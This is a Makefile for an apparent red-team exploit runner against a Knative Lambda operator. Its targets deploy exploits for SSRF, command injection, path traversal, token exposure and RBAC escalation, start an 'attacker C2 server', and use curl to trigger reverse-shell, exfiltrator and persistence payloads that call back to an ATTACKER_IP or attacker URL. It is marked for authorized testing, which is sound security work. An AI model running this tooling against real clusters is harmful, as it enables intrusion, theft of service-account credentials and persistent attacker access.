# Red Team Exploit Runner for Knative Lambda Operator
# ⚠️ AUTHORIZED TESTING ONLY

.PHONY: help run-all run cleanup verify setup-attacker payloads

NAMESPACE ?= redteam-test
ATTACKER_PORT ?= 8888
ATTACKER_URL ?= http://localhost:$(ATTACKER_PORT)
EXPLOIT ?= all

help:
	@echo "🔴 Red Team Exploit Runner"
	@echo ""
	@echo "Usage:"
	@echo "  make setup          - Create test namespace and prerequisites"
	@echo "  make setup-attacker - Start attacker C2 server"
	@echo "  make run-all        - Run all exploits (DANGEROUS)"
	@echo "  make run EXPLOIT=X  - Run specific exploit"
	@echo "  make payloads       - Deploy all payload LambdaFunctions"
	@echo "  make verify         - Verify exploit success"
	@echo "  make cleanup        - Remove all test resources"
	@echo ""
	@echo "Available exploits:"
	@echo "  blue-001-ssrf-git"
	@echo "  blue-002-template-injection"
	@echo "  blue-005-path-traversal"
	@echo "  blue-006-sa-token-exposure"
	@echo "  vuln-001-cmd-injection-git"
	@echo "  vuln-002-cmd-injection-minio"
	@echo "  vuln-003-inline-code-exec"
	@echo "  vuln-004-rbac-escalation"
	@echo "  vuln-013-receiver-escalation"
	@echo ""
	@echo "Available payloads (LambdaFunction CRDs):"
	@echo "  payload-reverse-shell"
	@echo "  payload-exfiltrator"
	@echo "  payload-persistence"

setup:
	@echo "🔧 Setting up test environment..."
	kubectl create namespace $(NAMESPACE) --dry-run=client -o yaml | kubectl apply -f -
	kubectl label namespace $(NAMESPACE) purpose=security-testing --overwrite
	@echo "✅ Test namespace ready: $(NAMESPACE)"

setup-attacker:
	@echo "🎯 Starting attacker C2 server on port $(ATTACKER_PORT)..."
	python3 scripts/attacker-server.py --port $(ATTACKER_PORT) &
	@echo "✅ Attacker server running on http://localhost:$(ATTACKER_PORT)"

run-all: setup
	@echo "⚠️  Running ALL exploits - ensure this is authorized!"
	@read -p "Type 'I UNDERSTAND' to continue: " confirm && [ "$$confirm" = "I UNDERSTAND" ] || exit 1
	@for dir in exploits/*/; do \
		echo "🔴 Running exploit: $$dir"; \
		kubectl apply -f $$dir -n $(NAMESPACE); \
		sleep 5; \
	done

run: setup
	@if [ "$(EXPLOIT)" = "all" ]; then \
		$(MAKE) run-all; \
	else \
		echo "🔴 Running exploit: $(EXPLOIT)"; \
		kubectl apply -f exploits/$(EXPLOIT)/ -n $(NAMESPACE); \
	fi

verify:
	@echo "🔍 Verifying exploit results..."
	@./scripts/verify-exploit.sh $(NAMESPACE)

cleanup:
	@echo "🧹 Cleaning up test resources..."
	kubectl delete namespace $(NAMESPACE) --ignore-not-found
	kubectl delete lambdafunctions -A -l redteam=true --ignore-not-found
	kubectl delete lambdaagents -A -l redteam=true --ignore-not-found
	kubectl delete clusterrolebinding attacker-admin --ignore-not-found
	kubectl delete clusterrole attacker-admin --ignore-not-found
	@echo "✅ Cleanup complete"

# Individual exploit targets
blue-001: setup
	kubectl apply -f exploits/blue-001-ssrf-git/ -n $(NAMESPACE)

blue-002: setup
	kubectl apply -f exploits/blue-002-template-injection/ -n $(NAMESPACE)

blue-005: setup
	kubectl apply -f exploits/blue-005-path-traversal/ -n $(NAMESPACE)

blue-006: setup
	kubectl apply -f exploits/blue-006-sa-token-exposure/ -n $(NAMESPACE)

vuln-001: setup
	kubectl apply -f exploits/vuln-001-cmd-injection-git/ -n $(NAMESPACE)

vuln-002: setup
	kubectl apply -f exploits/vuln-002-cmd-injection-minio/ -n $(NAMESPACE)

vuln-003: setup
	kubectl apply -f exploits/vuln-003-inline-code-exec/ -n $(NAMESPACE)

vuln-004: setup
	kubectl apply -f exploits/vuln-004-rbac-escalation/ -n $(NAMESPACE)

vuln-013: setup
	kubectl apply -f exploits/vuln-013-receiver-escalation/ -n $(NAMESPACE)

# =============================================================================
# Payload LambdaFunctions
# =============================================================================

payloads: setup
	@echo "🔴 Deploying all payload LambdaFunctions..."
	kubectl apply -f exploits/payload-reverse-shell/ -n $(NAMESPACE)
	kubectl apply -f exploits/payload-exfiltrator/ -n $(NAMESPACE)
	kubectl apply -f exploits/payload-persistence/ -n $(NAMESPACE)
	@echo "✅ Payloads deployed"

payload-reverse-shell: setup
	kubectl apply -f exploits/payload-reverse-shell/ -n $(NAMESPACE)

payload-exfiltrator: setup
	kubectl apply -f exploits/payload-exfiltrator/ -n $(NAMESPACE)

payload-persistence: setup
	kubectl apply -f exploits/payload-persistence/ -n $(NAMESPACE)

# Invoke payloads (requires functions to be running)
invoke-reverse-shell:
	@echo "🔴 Invoking reverse shell (connect listener first!)..."
	curl -X POST http://payload-reverse-shell.$(NAMESPACE).svc.cluster.local \
		-H "Content-Type: application/json" \
		-d '{"attacker_ip": "$(ATTACKER_IP)", "attacker_port": $(ATTACKER_PORT)}'

invoke-exfiltrator:
	@echo "🔴 Invoking exfiltrator..."
	curl -X POST http://payload-exfiltrator-full.$(NAMESPACE).svc.cluster.local \
		-H "Content-Type: application/json" \
		-d '{"attacker_url": "$(ATTACKER_URL)"}'

invoke-persistence:
	@echo "🔴 Invoking persistence..."
	curl -X POST http://payload-persistence-full.$(NAMESPACE).svc.cluster.local \
		-H "Content-Type: application/json" \
		-d '{"attacker_url": "$(ATTACKER_URL)", "namespace": "$(NAMESPACE)"}'
